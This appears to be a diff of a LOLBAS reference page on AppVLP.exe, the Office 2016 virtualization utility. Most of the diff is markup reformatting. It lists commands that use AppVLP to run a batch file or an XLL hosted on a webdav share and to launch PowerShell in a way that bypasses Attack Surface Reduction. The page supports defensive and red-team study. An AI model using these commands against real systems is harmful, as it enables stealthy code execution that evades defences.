@@ -28,15 +28,19 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/OtherMSBinaries/Appvlp/#execute">Execute</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/OtherMSBinaries/Appvlp/#execute">Execute</a></li>
+	
 </ul>
 
+	
+
 <p>Application Virtualization Utility Included with Microsoft Office 2016</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -50,98 +54,95 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://github.com/MoooKitty/Code-Execution">https://github.com/MoooKitty/Code-Execution</a></li>
+	<a href="https://github.com/MoooKitty/Code-Execution">https://github.com/MoooKitty/Code-Execution</a>
+	<br>
 	
-	<li><a href="https://twitter.com/moo_hax/status/892388990686347264">https://twitter.com/moo_hax/status/892388990686347264</a></li>
+	<a href="https://twitter.com/moo_hax/status/892388990686347264">https://twitter.com/moo_hax/status/892388990686347264</a>
+	<br>
 	
-	<li><a href="https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/">https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/</a></li>
+	<a href="https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/">https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/</a>
+	<br>
 	
-	<li><a href="https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/">https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/</a></li>
+	<a href="https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/">https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>fab - <a href="https://twitter.com/@0rbz_">@0rbz_</a </li>
+	fab - <a href="https://twitter.com/@0rbz_">@0rbz_</a>
+	<br>
 	
-	<li>Will - <a href="https://twitter.com/@moo_hax">@moo_hax</a </li>
+	Will - <a href="https://twitter.com/@moo_hax">@moo_hax</a>
+	<br>
 	
-	<li>Matt Wilson - <a href="https://twitter.com/@enigma0x3">@enigma0x3</a </li>
+	Matt Wilson - <a href="https://twitter.com/@enigma0x3">@enigma0x3</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Executes calc.bat through AppVLP.exe</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Executes calc.bat through AppVLP.exe
+		<br>
+		<pre><code>AppVLP.exe \\webdav\calc.bat</code></pre>
 		Usecase:Execution of BAT file hosted on Webdav server.
-        <pre><code>AppVLP.exe \\webdav\calc.bat</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows 10 w/Office 2016</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10 w/Office 2016
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
+		<br>
+		<pre><code>AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"</code></pre>
 		Usecase:Local execution of process bypassing Attack Surface Reduction (ASR).
-        <pre><code>AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows 10 w/Office 2016</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10 w/Office 2016
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
+		<br>
+		<pre><code>AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"</code></pre>
 		Usecase:Local execution of process bypassing Attack Surface Reduction (ASR).
-        <pre><code>AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows 10 w/Office 2016</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10 w/Office 2016
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
